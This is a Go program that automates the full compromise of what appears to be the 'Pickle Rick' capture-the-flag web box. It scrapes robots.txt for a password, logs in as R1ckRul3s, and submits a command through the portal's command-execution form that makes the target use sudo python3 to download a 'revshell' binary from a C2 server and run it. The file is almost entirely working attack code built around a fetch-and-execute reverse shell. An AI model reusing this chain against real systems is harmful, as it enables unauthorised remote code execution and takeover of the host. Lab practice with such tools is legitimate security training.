package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL string
	C2IP    string
	C2Port  int
	Route   string
	Session *http.Client
}

type CookieJar struct {
	jar map[string][]*http.Cookie
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func (c *Client) buildReverseShell() (shellcommand string, success bool, message string) {
	c2baseURL := fmt.Sprintf("http://%s:%d", c.C2IP, c.C2Port)
	shellFile := "revshell"
	downloadURL := fmt.Sprintf("%s/%s", c2baseURL, shellFile)

	pyimports := "import requests;import os"
	pysave := "f=open('/tmp/x','wb');f.write(r.content);f.close()"
	pyexec := "os.system('chmod +x /tmp/x;/tmp/x')"

	shellcommand = fmt.Sprintf("sudo python3 -c \"%s;r=requests.get('%s');%s;%s\"", pyimports, downloadURL, pysave, pyexec)
	return shellcommand, true, "reverse shell generated"
}

func (c *Client) ConfirmPortalAccess() (success bool, message string) {
	var tgtpattern string = "<a.*Rick Portal</a>"

	SysMsgNB("confirming access to portal")
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/portal.php", c.baseURL), nil)
	if err != nil {
		return false, err.Error()
	}

	resp, err := c.Session.Do(req)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	bodyContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err.Error()
	}

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return false, err.Error()
	}

	matches := re.FindAll(bodyContent, -1)

	if len(matches) < 1 {
		return false, "unable to confirm portal access"
	}

	return true, "portal access confirmed"
}

func (c *Client) GrabRobots() (password string, success bool, message string) {
	var targetURL string

	c.Route = "robots.txt"
	targetURL = fmt.Sprintf("%s/%s", c.baseURL, c.Route)

	SysMsgNB(fmt.Sprintf("pulling down %s", c.Route))
	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return "", false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return "", false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	SysMsgNB(fmt.Sprintf("reading %s", c.Route))
	bodyContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", false, err.Error()
	}

	SysMsgNB(fmt.Sprintf("saving %s to local file", c.Route))
	fptr, err := os.Create(c.Route)
	if err != nil {
		return "", false, err.Error()
	}
	defer fptr.Close()

	_, err = fptr.Write(bodyContent)
	if err != nil {
		return "", false, err.Error()
	}

	password = strings.Replace(string(bodyContent), "\n", "", -1)

	return password, true, "robots.txt successfully pulled down"
}

func (c *Client) Login(password string) (success bool, message string) {
	var tgtpattern string = "<h3>Portal Login Page</h3>"
	var username string = "R1ckRul3s"

	formData := url.Values{}
	formData.Set("username", username)
	formData.Set("password", password)
	formData.Set("sub", "Login")

	SysMsgNB(fmt.Sprintf("attempting login using \"%s:%s\"", username, password))

	resp, err := c.Session.PostForm(fmt.Sprintf("%s/login.php", c.baseURL), formData)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return false, err.Error()
	}

	bodyContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err.Error()
	}

	matches := re.FindAll(bodyContent, -1)
	if len(matches) > 0 {
		return false, "login unsuccessful"
	}

	cookieURL, err := url.Parse(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	c.Session.Jar.SetCookies(cookieURL, resp.Cookies())

	success, message = c.ConfirmPortalAccess()
	if !success {
		return success, message
	}

	return true, "login successful"
}

func (c *Client) RunCommand(command string) (success bool, message string) {
	var formData url.Values = url.Values{}
	var targetURL string

	c.Route = "portal.php"

	targetURL = fmt.Sprintf("%s/%s", c.baseURL, c.Route)

	formData.Set("command", command)
	formData.Set("sub", "Execute")

	resp, err := c.Session.PostForm(targetURL, formData)
	if err != nil {
		if e, ok := err.(net.Error); ok && e.Timeout() {
			return true, "timeout encountered. shell appears to be running."
		}
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "command executed"
}

func main() {
	var targetIP string
	var sessionjar *cookiejar.Jar
	var client *Client = &Client{Session: &http.Client{Timeout: 10 * time.Second}}

	flag.StringVar(&targetIP, "i", "127.0.0.1", "IP address of target (with port)")
	flag.StringVar(&client.C2IP, "c", "127.0.0.1", "IP address of C2 server")
	flag.IntVar(&client.C2Port, "p", 9999, "C2 server communication port")
	flag.Parse()

	sessionjar, err := cookiejar.New(nil)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	client.baseURL = fmt.Sprintf("http://%s", targetIP)
	client.Session.Jar = sessionjar

	InfMsg(fmt.Sprintf("Base URL: %s", client.baseURL))

	password, success, message := client.GrabRobots()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.Login(password)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	tgtcommand, success, message := client.buildReverseShell()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.RunCommand(tgtcommand)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	return
}

